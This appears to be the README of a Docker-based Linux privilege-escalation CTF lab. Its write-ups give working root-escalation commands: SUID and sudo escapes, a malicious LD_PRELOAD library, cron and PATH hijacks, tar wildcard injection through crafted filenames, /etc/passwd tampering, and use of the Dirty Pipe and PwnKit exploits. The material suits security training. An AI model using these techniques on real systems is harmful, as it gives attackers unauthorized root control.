# Linux Privilege Escalation — CTF Lab

A collection of 14 Docker-based labs covering the most common Linux privesc
techniques found in CTF competitions and penetration tests.

Each container starts you as the low-privilege user **`wocsa`** (the password is alaway **`wocsa`**) — see the Dockerfile for each lab).
The goal of every lab is to **read `/root/flag.txt`**.

---

## Quick start

```bash
# Build all images (first run — takes a few minutes)
docker compose build

# Start all labs (SSH accessible on ports 30001–30014)
docker compose up -d

# Connect to a specific lab via SSH
ssh wocsa@localhost -p 30001

# Or build & run a single lab without docker compose
docker build -t privesc-lab-01 ./01-suid-find
docker run --rm -it privesc-lab-01
```

---

## Lab index

| Lab | Technique | Difficulty |
|-----|-----------|------------|
| 01 | SUID find | ⭐ Easy |
| 02 | SUID python3 | ⭐ Easy |
| 03 | SUID bash | ⭐ Easy |
| 04 | Sudo NOPASSWD → awk (GTFOBins) | ⭐ Easy |
| 05 | Sudo LD_PRELOAD via env_keep | ⭐⭐ Medium |
| 06 | Writable root cron script | ⭐⭐ Medium |
| 07 | Cron PATH hijacking | ⭐⭐ Medium |
| 08 | Cron wildcard injection (tar) | ⭐⭐ Medium |
| 09 | World-writable /etc/passwd | ⭐ Easy |
| 10 | Linux capabilities (cap_setuid) | ⭐⭐ Medium |
| 11 | Credential hunting & reuse | ⭐ Easy |
| 12 | SUID binary → PATH hijacking | ⭐⭐ Medium |
| 13 | Dirty Pipe (CVE-2022-0847) | ⭐⭐⭐ Hard |
| 14 | PwnKit / copy_fail (CVE-2021-4034) | ⭐⭐⭐ Hard |

---

## Lab write-ups & solutions

### Lab 01 — SUID find

```bash
# Detection
find / -perm -4000 -type f 2>/dev/null   # reveals /usr/bin/find

# Exploitation
find . -exec /bin/sh -p \; -quit
cat /root/flag.txt
```

---

### Lab 02 — SUID python3

```bash
# Detection
find / -perm -4000 -type f 2>/dev/null   # reveals /usr/bin/python3

# Exploitation
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
cat /root/flag.txt
```

---

### Lab 03 — SUID bash

```bash
# Detection
ls -la /bin/bash    # shows -rwsr-xr-x

# Exploitation  (-p preserves the effective UID)
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 04 — Sudo NOPASSWD → awk

```bash
# Detection
sudo -l             # shows: (root) NOPASSWD: /usr/bin/awk

# Exploitation (GTFOBins)
sudo awk 'BEGIN {system("/bin/bash")}'
cat /root/flag.txt
```

---

### Lab 05 — Sudo LD_PRELOAD

```bash
# Detection
sudo -l             # shows env_keep+=LD_PRELOAD + NOPASSWD: /usr/bin/find

# Step 1: Write malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# Step 2: Compile
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# Step 3: Trigger
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
cat /root/flag.txt
```

---

### Lab 06 — Writable root cron script

```bash
# Detection
cat /etc/cron.d/cleanup          # root runs /opt/cleanup.sh every minute
ls -la /opt/cleanup.sh           # -rwxrwxrwx  (world-writable!)

# Exploitation
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
# Wait up to 60 seconds for cron to fire, then:
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 07 — Cron PATH hijacking

```bash
# Detection
cat /etc/cron.d/syscheck         # PATH=/tmp:/usr/local/...
cat /opt/syscheck.sh             # calls 'ps' without /usr/bin/ps

# Exploitation
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/ps
chmod +x /tmp/ps
# Wait up to 60 seconds, then:
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 08 — Cron wildcard injection (tar)

```bash
# Detection
cat /etc/cron.d/backup           # tar czf ... *  in /var/backups/uploads
ls -la /var/backups/uploads/     # writable by all

# Exploitation
cd /var/backups/uploads
echo 'chmod +s /bin/bash' > privesc.sh
printf '' > "--checkpoint=1"
printf '' > "--checkpoint-action=exec=sh privesc.sh"
# tar expands * → interprets filenames as flags
# Wait up to 60 seconds, then:
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 09 — World-writable /etc/passwd

```bash
# Detection
ls -la /etc/passwd               # -rw-rw-rw-  (world-writable!)

# Exploitation
# Generate a password hash
openssl passwd -1 -salt x hacked
# → $1$x$EUHpqIbMxQnhsZr5sTGlN/   (example)

# Append a new root-level user
echo 'r00t:$1$x$EUHpqIbMxQnhsZr5sTGlN/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch user
su r00t   # password: hacked
cat /root/flag.txt
```

---

### Lab 10 — Linux capabilities (cap_setuid)

```bash
# Detection (ls -la shows nothing — you need getcap)
getcap -r / 2>/dev/null
# → /usr/bin/python3.8 = cap_setuid+ep

# Exploitation
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/flag.txt
```

---

### Lab 11 — Credential hunting & reuse

```bash
# Discovery
grep -rn "password\|passwd\|DB_PASS" /var/www/ /opt/ 2>/dev/null
# or check bash history:
cat ~/.bash_history

# Found: Sup3rS3cr3t!2024

# Exploitation
su root   # password: Sup3rS3cr3t!2024
cat /root/flag.txt
```

---

### Lab 12 — SUID binary PATH hijacking

```bash
# Detection
find / -perm -4000 -type f 2>/dev/null   # finds /usr/local/bin/sysinfo
strings /usr/local/bin/sysinfo
# → "service --status-all"   (no absolute path!)

# Exploitation
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/sysinfo           # triggers, calls our fake 'service'
/bin/bash -p
cat /root/flag.txt
```

---

### Lab 13 — Dirty Pipe (CVE-2022-0847)(Works only on old machines)

> ⚠️ **Kernel dependency:** Docker shares the *host* kernel — the container
> image does not change it.  Dirty Pipe requires **Linux 5.8 – 5.16.11**
> (also 5.15.x < 5.15.25 and 5.10.x < 5.10.102).
>
> Unlike Dirty COW there is **no race condition**: on a vulnerable kernel the
> page-cache write is immediate and deterministic — the exploit never fails.
> On a patched kernel the `write()` returns `EINVAL` and nothing is overwritten.
>
> **To run this lab reliably**, wrap the container in a VM pinned to a
> vulnerable kernel:
> ```
> Vagrant box : ubuntu/impish64   (Ubuntu 21.10, kernel 5.13.0)
> Package     : linux-image-5.13.0-19-generic
> ```
> Check your current host kernel with `uname -r` before starting.

**Background:** Every `pipe_buffer` entry has a `flags` field.
When a new buffer entry is allocated it is **not zeroed**, so it inherits
whatever flags the previous occupant left behind.  If a prior `write()` into
the pipe set `PIPE_BUF_FLAG_CAN_MERGE` on a slot, and that slot is later
reused to hold a page brought in by `splice()` from a read-only file, a
subsequent `write()` into the pipe will **merge directly onto that cached
page** — bypassing copy-on-write entirely.  Because the page cache is the
authoritative source for both `mmap()` and `exec()`, a SUID-root binary
whose cached pages are patched this way will execute attacker-controlled
code the next time any user runs it.  The on-disk inode is never touched.

```bash
# ── Detection ────────────────────────────────────────────────
uname -r
# Vulnerable: 5.8.0 ≤ kernel ≤ 5.16.11
#             5.15.x < 5.15.25
#             5.10.x < 5.10.102

# A dedicated SUID-root target binary is waiting in the container:
ls -la /usr/local/bin/suid_target   # -rwsr-xr-x  root root

# ── Exploitation ─────────────────────────────────────────────
cd ~
make                                 # gcc -O2 dirtypipe.c -o dirtypipe
./dirtypipe /usr/local/bin/suid_target
# [*] CVE-2022-0847 Dirty Pipe
# [*] Writing shellcode payload (63 bytes) at file offset 1
# [+] Page-cache patch applied.
# [+] Execute the patched binary now:
#       /usr/local/bin/suid_target -p

# In a second terminal (or the same one):
/usr/local/bin/suid_target -p       # runs as root via the patched page cache
cat /root/flag.txt

# Back in the exploit terminal — press ENTER to restore the binary:
# [*] Binary restored.
```

**What happens step by step:**
1. `prep_pipe()` fills then drains the pipe — every buffer slot now has `PIPE_BUF_FLAG_CAN_MERGE` set from the writes
2. `splice(fd, offset=1, pipe, ...)` pulls one page of `suid_target` into the pipe — the page arrives with `CAN_MERGE` already set on its slot
3. `write(pipe, shellcode, len)` — the kernel sees `CAN_MERGE`, skips CoW, and writes the shellcode directly onto the live page-cache entry
4. The on-disk binary is unchanged; only the in-memory page cache is patched
5. `suid_target -p` executes: the kernel maps the patched page, runs `setuid(0)` + `execve("/bin/bash", ["-p"])` → root shell
6. After capturing the flag, the PoC re-runs the splice+write sequence with the original bytes to restore the page cache

**Key concepts:**
- Uninitialised `pipe_buffer.flags` → stale `PIPE_BUF_FLAG_CAN_MERGE` survives slot reuse
- `splice()` imports a read-only file page into a pipe without triggering CoW
- Merging `write()` lands directly on the live page-cache entry, bypassing file permissions
- Only the page cache is modified — the inode and on-disk file are untouched
- CVE-2022-0847, disclosed 2022-02-20, patched in Linux 5.16.11 / 5.15.25 / 5.10.102

---

### Lab 14 — PwnKit / copy_fail (CVE-2021-4034)(Broken)

> ✅ **No kernel dependency:** this exploit targets the userland `pkexec`
> SUID binary, not the kernel.  It works reliably in Docker regardless of
> host kernel version, provided the container image ships the vulnerable
> `policykit-1` package (< 0.120), which the `ubuntu:21.04` base image does.

**Background:** `pkexec` (the PolicyKit SUID helper) performs an out-of-bounds
read/write when called with `argc == 0`.  In that case `argv[1]` overlaps
`envp[0]` on the stack.  `pkexec` then rewrites this value and re-executes
itself — which lets an attacker inject `GCONV_PATH` into pkexec's *trusted*
environment.  `pkexec` subsequently loads a locale conversion library from
that attacker-controlled path with root privileges.

```bash
# Detection — check pkexec version
pkexec --version          # < 0.120 is vulnerable
dpkg -l policykit-1       # ubuntu:21.04 ships 0.105-31

# Exploitation
cd ~
make                      # compiles pwnkit (launcher) + pwnkit_payload.so
./pwnkit                  # spawns pkexec with argc=0, injects GCONV_PATH
# Output: "[+] /bin/bash is now SUID root."
/bin/bash -p
cat /root/flag.txt
```

**What happens step by step:**
1. `pwnkit` calls `execve("/usr/bin/pkexec", {NULL}, crafted_envp)` — argc is 0
2. pkexec reads `argv[1]` → actually reads `envp[0]` = `"lol"` (our dir name)
3. pkexec rewrites that slot with its own executable path (OOB write into envp)
4. pkexec re-execs itself — our `GCONV_PATH=.` is now in its environment
5. glibc's iconv reads `./lol/gconv-modules`, loads `./lol/pwnkit_payload.so`
6. The payload constructor runs as root: `chmod 4755 /bin/bash`

**Key concepts:**
- `argc == 0` stack layout: `argv[1]` == `envp[0]`
- Out-of-bounds write via pkexec's unsafe path normalisation
- Trusted environment bypass via `GCONV_PATH` / iconv module loading
- CVE-2021-4034, patched January 2022 (policykit-1 0.120+)

---

## Recommended enumeration flow (use inside any lab)

```bash
# 1. Who am I and what groups?
id && whoami

# 2. Sudo rights — highest value check
sudo -l

# 3. SUID/SGID binaries
find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Writable files and cron jobs
cat /etc/crontab /etc/cron.d/* 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# 6. Credential hunting
grep -rn "password\|passwd" /var/www/ /opt/ /home/ 2>/dev/null | head -20

# 7. Kernel version (for kernel exploit suggestions)
uname -a && cat /proc/version
```


## Docker vs VM — kernel exploit considerations

| Technique | Works in Docker? | Notes |
|-----------|-----------------|-------|
| SUID / sudo / cron / capabilities | ✅ Yes | Fully userland — no kernel dependency |
| Writable files / credential hunting | ✅ Yes | Fully userland |
| PwnKit / CVE-2021-4034 | ✅ Yes | Targets pkexec binary, not kernel |
| Dirty Pipe / CVE-2022-0847 | ⚠️ Host-dependent | Needs host kernel 5.8 – 5.16.11; deterministic (no race) |
| Dirty COW / CVE-2016-5195 | ⚠️ Host-dependent | Needs host kernel < 4.8.3; race condition — unreliable |
| Kernel ROP / heap exploits | ❌ No | Require a VM with a pinned kernel |

For reliable kernel exploit labs, wrap your containers in a **QEMU/KVM VM**
(e.g. via Vagrant + libvirt) provisioned with the target kernel version.

---

*Built for security training and CTF preparation. Run only in isolated environments.*